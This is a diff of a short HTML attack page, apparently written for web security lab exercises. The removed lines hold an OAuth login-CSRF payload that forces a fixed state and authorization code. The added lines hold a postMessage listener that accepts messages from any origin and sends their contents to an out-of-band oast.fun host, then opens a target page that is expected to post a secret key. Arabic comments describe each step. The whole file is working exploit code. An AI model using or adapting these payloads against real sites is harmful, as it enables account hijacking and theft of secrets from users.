@@ -1,17 +1,30 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="utf-8">
-    <title>Homelab</title>
+    <meta charset="UTF-8">
+    <title>test</title>
 </head>
 <body>
 
-<img src="http://ptl-c0500a35-c549e685.libcurl.so/users/auth/myprovider?state=sh3rif0xsh3rif0x">
-
 <script>
-    setTimeout(function () {
-        window.location = "http://ptl-c0500a35-c549e685.libcurl.so/users/auth/myprovider/callback?code=c560e69c4eee81f52ddace3092d62dc0eaab30552cdf3c1d1ae4d7502fa84c83&state=sh3rif0xsh3rif0x";
-    }, 2000);
+window.addEventListener("message", function (event) {
+
+    // تحويل الداتا لنص حقيقي
+    var dataAsText = encodeURIComponent(
+        typeof event.data === "object"
+            ? JSON.stringify(event.data)
+            : event.data
+    );
+
+    // إرسال الداتا
+    var img = document.createElement("img");
+    img.src = "http://wlikmodtjuxpisuqbswjvxs2tboi59zla.oast.fun/?leak=" + dataAsText;
+    document.body.appendChild(img);
+
+}, false);
+
+// فتح الصفحة اللي بتبعت الرسالة
+window.open("https://ptl-dd2cc21c196c-b6243f83a99e.libcurl.me/key/0");
 </script>
 
 </body>
